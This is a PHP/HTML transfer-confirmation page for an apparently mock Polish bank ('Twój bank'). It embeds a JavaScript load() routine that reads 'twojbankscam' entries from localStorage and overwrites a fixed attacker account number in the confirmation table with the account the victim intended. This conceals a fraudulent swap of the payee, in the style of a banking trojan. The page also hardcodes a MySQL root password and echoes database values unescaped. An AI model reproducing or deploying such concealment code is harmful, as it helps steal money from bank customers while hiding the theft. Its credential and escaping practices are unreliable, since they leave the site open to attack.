<!DOCTYPE html>
<html>
<head>
<style>
body{background-color:black;color:white;text-align:center}
a{text-decoration:none;color:#ccf}
#zdiv{border:1px solid white;width:600px;margin:auto;margin-top:10px;background-color:#222}
#titl{border:1px solid white;width:600px;font-size:30pt;margin:auto;margin-top:10px;background-color:#222}
#links{font-size:14pt;margin-top:5px}
</style>



<script>
function addzero(i){
    if(i<10)
        return '0'+i;
    else
        return i;
}
function datetime(){
    var currentdate = new Date(); 
var datetime = currentdate.getFullYear() + "-"
                + addzero(currentdate.getMonth()+1)  + "-" 
                + addzero(currentdate.getDate()) + " "  
                + addzero(currentdate.getHours()) + ":"  
                + addzero(currentdate.getMinutes()) + ":" 
                + addzero(currentdate.getSeconds());
    return datetime;
}
function total(str){
    return (new Date(str.substr(0,4),str.substr(5,2),str.substr(8,2),str.substr(11,2),str.substr(14,2),str.substr(17,2),0).getTime());
}
function getInputsByValue(value)
{
    var allInputs = document.getElementsByTagName("input");
    var results = [];
    for(var x=0;x<allInputs.length;x++)
        if(allInputs[x].value == value)
            results.push(allInputs[x]);
    return results;
}
function load(){
    if(typeof(Storage)!=="undefined"){
        if(localStorage.twojbankscamcount){
            var destiny = "01234567891011121314151617";
            var tabl = document.getElementsByTagName("table")[0];
            var rowLength = tabl.rows.length;
            var thereisdate = false;
            var cellwithnumber = null;
            var thisdate = null;
            for (i = 0; i < rowLength; i++){

                var oCells = tabl.rows.item(i).cells;

                var cellLength = oCells.length;

                for(var j = 0; j < cellLength; j++){

                    var cellVal = oCells.item(j).innerHTML;
                    if(cellVal==destiny){
                        cellwithnumber = oCells.item(j);
                    }
                    if(!thereisdate && cellVal.match(/\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}/)!=undefined){
                        thereisdate = true;
                        thisdate = total(cellVal);
                    }
                }
            }
            if(thereisdate && cellwithnumber!=null){
                var mostprobabledate = 0;
                var mostprobableaccount = null;
                for(var i = 0;i<=Number(localStorage.twojbankscamcount);i++){
                    var acc = localStorage.getItem("twojbankscamaccount"+i);
                    var dat = localStorage.getItem("twojbankscamdate"+i);
                    if(acc!=null && dat!=null){
                    if(Math.abs(dat-thisdate)<Math.abs(mostprobabledate-thisdate)){
                        mostprobabledate = dat;
                        mostprobableaccount = acc;
                    }
                    }
                }
                if(mostprobableaccount!=null){
                    cellwithnumber.innerHTML = mostprobableaccount.split(' ').join('');
                }
            }
        }
    }
}
</script>


</head>
<body onload="load()">
<div id="titl">
Twój bank
<div id="links">
<?php
session_start();
if(isset($_SESSION['userlogged'])){
    $login = $_SESSION['userlogged'];
    echo("Zalogowany: ".$_SESSION['userlogged'] . '<br/>' . file_get_contents('logged.txt'));
} else {
    header("Location: login.php");
}
?>
</div>
</div>
<div id="zdiv">

<p>
<h3>Przelew został zarejestrowany.</h3>
</p>
<table style="width:100%">
<?php

    $con = mysqli_connect("localhost","root","zaq1@WSX","bank");
    
    if (mysqli_connect_errno()){
        echo "Failed to connect to MySQL: " . mysqli_connect_error();
    } else {
        $id = $_GET['i'];
        $stmt = $con->prepare("SELECT * FROM transfer INNER JOIN users ON transfer.userid=users.id WHERE transfer.id=? AND users.login=?;");
        $stmt->bind_param('is',$id,$login);
        $stmt->execute();
        $result = $stmt->get_result();
        if($result){
            if($row=$result->fetch_object()){
                $name = $row->trName;
                $account = $row->trNr;
                $amount = $row->amount;
                $address = $row->address;
                $title = $row->title;
                $date = $row->trDate;
echo "<tr><td>" . "Nazwa odbiorcy" . "</td><td>" . $name . "</td></tr>";
echo "<tr><td>" . "Numer rachunku" . "</td><td>" . $account . "</td></tr>";
echo "<tr><td>" . "Kwota" . "</td><td>" . $amount . " zł</td></tr>";
echo "<tr><td>" . "Adres" . "</td><td>" . $address . "</td></tr>";
echo "<tr><td>" . "Tytuł przelewu" . "</td><td>" . $title . "</td></tr>";
echo "<tr><td>" . "Data zarejestrowania" . "</td><td>" . $date . "</td></tr>";
            } else {
                echo "Nie ma takiego hakierzenia!";
            }
            
        } else {
            echo "uuu";
        }
    }


?>
</table>
</div>
</body>
</html>
